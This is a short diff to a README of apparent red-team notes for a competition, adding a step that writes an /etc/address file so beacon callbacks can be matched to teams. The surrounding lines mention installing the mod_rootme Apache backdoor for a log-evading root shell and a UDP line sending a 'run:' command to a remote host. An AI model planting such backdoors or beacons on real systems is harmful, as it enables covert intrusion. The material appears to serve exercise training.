@@ -52,6 +52,9 @@ echo "run:touch /tmp/win" > /dev/udp/172.25.40.20/1337
 ### Install the mod_rootme Apache mod (root shell from a web request, doesn't hit access_logs)
 /opt/payloads/common/apache-client [IP]
 
+### Create an /etc/address file
+This file contains the external IP address of the machine.  When a beacon calls back, the machine looks identical for every team.  This will let us figure out which team the specific callback belongs to.
+
 # Windows
 This folder is full of windows bits
 
